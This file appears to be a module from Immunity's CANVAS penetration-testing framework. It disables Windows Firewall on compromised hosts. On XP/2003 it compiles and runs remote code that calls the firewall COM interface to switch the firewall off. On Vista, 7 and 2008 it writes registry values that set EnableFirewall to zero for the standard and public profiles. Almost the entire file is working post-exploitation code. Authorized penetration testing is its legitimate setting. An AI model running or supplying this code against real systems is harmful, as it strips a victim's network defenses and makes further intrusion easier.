#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2009
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path:
    sys.path.append(".")

import os,getopt
import socket
from exploitutils import *
import canvasengine
import time

from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand

import mosdef


NAME                = "Disable Windows Firewall"
DESCRIPTION         = "Disable Windows Firewall through COM interface in XP/2003 (Instantly) or by registry in Win7/Vista/2008 (need service restart to take effect)"
VERSION             = "1.0"

DOCUMENTATION       = {}

PROPERTY            = {}
PROPERTY['TYPE']    = "Commands"
PROPERTY['SITE']    = "Local"
PROPERTY['ARCH']    = [ ["Windows"] ]

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)

        return
            
    def DisableWindowsFirewall( self ):
        vars={}
        vars["NetFwMgr"]      = "\x42\xE9\x4C\x30\x39\x6E\xD8\x40\x94\x3A\xB9\x13\xC4\x0C\x9C\xD4" # NetFwMgr GUID {304CE942-6E39-40D8-943A-B913C40C9CD4}
        vars["INetFwMgr"]     = "\xF5\x8A\x89\xF7\xC4\xCA\x32\x46\xA2\xEC\xDA\x06\xE5\x11\x1A\xF2" # INetFwMgr interface GUID {F7898AF5-CAC4-4632-A2EC-DA06E5111AF2}          


        disable_code = """
        #import "remote", "ole32|CoInitialize" as "CoInitialize"
	    #import "remote", "ole32|CoCreateInstance" as "CoCreateInstance"

        #import "local","debug" as "debug"
        #import "local","callvfunction" as "callvfunction"   

        #import "local", "sendint" as "sendint"

        #import "string", "NetFwMgr" as "NetFwMgr"
        #import "string", "INetFwMgr" as "INetFwMgr"



        void main()
        {

	      int hCOM;
	      int bresult;
	      int *ppv;
          int *fwPolicy;
          int *fwProfile;
          int hr;

          
	      hCOM = CoInitialize(0);
	      
      //  debug();
          bresult = CoCreateInstance(NetFwMgr,0,1,INetFwMgr,ppv); // Create an instance of the firewall settings manager. (CLSCTX_INPROC_SERVER 0x1)
   
          if (bresult != 0) {
            sendint(bresult);                                      // Failed to initilize COM object.
            return;
           }

          else {
         
                    hr = callvfunction(*ppv,fwPolicy,0x1C,*ppv);                // Retrieve the local firewall policy.
                    if (hr!=0) {
                            sendint(hr);                                         
                            return;
                   }

                    hr = callvfunction(*fwPolicy,fwPolicy,0x1C,*fwPolicy);     // Retrieve the firewall profile currently in effect.
                    if (hr!=0) {
                            sendint(hr);                                          
                            return;
                   }

                    hr = callvfunction(*fwPolicy,0,0x24,*fwPolicy);            // Set Firewall OFF
                    if (hr!=0) {
                            sendint(hr);                                          
                            return;
                   }
                     
                      sendint(1);
	                  return;
            }
   
     }
            """


	return self.node.shell.runCode(disable_code, vars)

                        
    def run(self):


        self.setInfo("%s (in progress)" % (NAME))

        node        = self.argsDict["passednodes"][0]
        self.result = []

        for node in self.argsDict["passednodes"]:
            self.node       = node
            nodetype        = node.nodetype
            capabilities    = node.capabilities

            if "win32api" in capabilities:

                ver = node.shell.GetVersionEx()              
                ver = ver[1]         
                if ver["Major Version"] >= 6:
                    

                    #Disable through registry (need reboot in Win7/Vista/2008)
                    reg = canvasengine.getModuleExploit("modify_registry")
                    reg.link
                    reg.reg_key      = "SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" #Standard
                    reg.reg_subkey      = "EnableFirewall"
                    reg.reg_type      = "REG_DWORD"
                    reg.reg_val      = "0"
                    reg.hive      = "HKEY_LOCAL_MACHINE"
                    reg.argsDict["passednodes"]=[node]
                    reg.run()
                      
                    reg.reg_key  = "SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile" #Public
                    reg.run()
                    
                    self.log("Disabled through registry (restart MpsSvc service to take effect)")
                    
                    ret = 1
                    self.result += [ret]

                else:

                    #Disable through COM interface (XP/2003 only - instant effect)
                    ret = self.DisableWindowsFirewall()
                    
                    self.log("Disable through COM interface (XP/2003 only - instant effect)")
                    self.log("Return result: 0x%08x" % ret)
                    self.result += [ret]
                    
                if ret == 1:
                    self.log("Successfully disabled Windows Firewall. 0x%08x" % ret)
                else:
                    self.log("Couldn't turn off Windows Firewall, make sure you have Administrator privileges. 0x%08x" % ret)
            
            else:
                self.log("The node named %s of type %s does not have the capabilities needed to run this command"%(node.get_name(),nodetype))
                self.result += [0]
                
        if 1 in self.result:
            ret = 1
        else:
            ret = 0

        self.dispshellcmd = self.command
        self.setInfo("%s - (finished)" % (NAME))
        return ret

